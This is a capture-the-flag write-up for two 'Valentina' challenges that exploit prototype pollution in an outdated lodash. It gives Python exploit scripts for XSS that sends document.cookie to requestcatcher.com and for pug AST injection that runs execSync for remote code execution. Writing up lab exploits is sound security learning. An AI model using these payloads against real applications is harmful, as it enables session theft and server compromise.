# Valentina 1
Exploit: Prototype Pollution and XSS

The npm library `lodash` is very old - the specific version that Valentina is using is vulnerable to prototype pollution. 

TL;DR - prototype pollution is a JavaScript-soecific vulnerability that abuses prototypal inheritance to poison the base JS object with properties you want. This affects ALL objects.

2 potential ways to solve. 

1. Proto-pollute the `doctype` value of the homepage with an XSS payload, and make Valentina visit the homepage.

```py
import requests

url = "http://localhost:8999/add_review"

payload = "fetch('https://requestcatcher.com/'+document.cookie)"

review = requests.post(url,
                       data='{"__proto__": {"doctype": "HTML> <script>fetch(\"requestcatcher?x=\"+document.cookie)</script"}}', headers={'content-type': 'application/json'})
```

2. Notice that the npm library `xss` was being used to clean potentially harmful input out of user-submitted reviews. You can proto-pollute objects with a `whiteList` property to make the `xss` library ignore potentially harmful characters. Inject XSS into a review and make Valentina visit `/view_review`.

```py
import requests

url = "http://localhost:8999/add_review"

payload = "fetch('https://requestcatcher.com/'+document.cookie)"

review = requests.post(url,
                       data='{"__proto__": {"whiteList": {"script": []}}, "message": "<script>' + payload + '</script>"}', headers={'content-type': 'application/json'})

id = review.text.split(":")[1]

print("http://localhost:8999/view_review?review_id=" + id)
```

# Valentina 2
Exploit: Prototype Pollution and AST injection to achieve RCE

Same deal with lodash. The site has a template engine (pug). You can use prototype pollution to inject [AST](https://en.wikipedia.org/wiki/Abstract_syntax_tree) (via the pug `block` property) during the compile/parse phase of the template engine and achieve RCE.

```python
import requests

TARGET_URL = 'https://valentina.ctf.maplebacon.org'
#TARGET_URL = localhost


requests.post(TARGET_URL + '/add_review', json = {
    "__proto__" : {
            "block": {
                "type": "Text", 
                "line": "process.mainModule.require('child_process').execSync(`echo hello`)"
        }
    }
})
```

This will also work for Val 1.